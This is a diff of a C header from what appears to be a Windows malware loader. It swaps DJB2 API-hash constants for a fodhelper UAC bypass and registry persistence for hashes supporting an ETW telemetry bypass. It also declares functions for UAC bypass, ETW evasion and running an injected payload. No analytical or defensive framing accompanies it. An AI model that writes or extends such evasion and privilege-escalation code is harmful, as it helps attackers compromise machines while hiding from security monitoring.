@@ -36,14 +36,9 @@
 #define NET_PROTOCOL_DLL_HASH                  0x22D3B5ED      // ntdlldll_DJB2
 #define ADVAPI_PROTOCOL_DLL_HASH               0x67208A49      // advapi32dll_DJB2
 
-// Registry and DLL hashes - updated to match HashCalculator exactly
-#define REG_CREATE_HASH                        0x46CEB3B4      // RegCreateKeyExW_DJB2
-#define REG_SET_VALUE_HASH                     0x34587300      // RegSetValueExW_DJB2
-#define REG_CLOSE_KEY_HASH                     0x736B3702      // RegCloseKey_DJB2
-#define SHELL_EXEC_HASH                        0x38174207      // ShellExecuteW
-#define FODHELPER_BYPASS_HASH                  0xD7C8EACE      // FodhelperBypass
-#define advapi32dll_DJB2                       0x67208A49      // Hash for advapi32.dll
-#define shell32dll_DJB2                        0x0D6501AC      // Hash for shell32.dll
+// ETW Bypass related hashes
+#define NT_TRACEEVENT_HASH                     0x1E2085F8      // NtTraceEvent_DJB2
+#define NT_WRITE_HASH                          0x95F3A792      // NtWriteVirtualMemory_DJB2
 
 //--------------------------------------------------------------------------------------------------------------------------------------------------
 // Protocol Handler Structure
@@ -116,10 +111,9 @@ VOID XmScheduleAsyncOperation(IN PVOID pInjectedPayload);
 BOOL XmFetchResourceData(IN HMODULE hModule, IN WORD wResourceId, OUT PBYTE* ppResourceBuffer, OUT PDWORD pdwResourceSize);
 
 //--------------------------------------------------------------------------------------------------------------------------------------------------
-// UAC and Persistence Functions
+// ETW and Security Functions
 
+BOOL XmBypassEtwProtection(VOID);  // New ETW bypass function
 BOOL XmBypassUAC(VOID);
-BOOL XmSetPersistence(VOID);
-BOOL XmSetPersistence(VOID);
 
 #endif // !COMMON_H
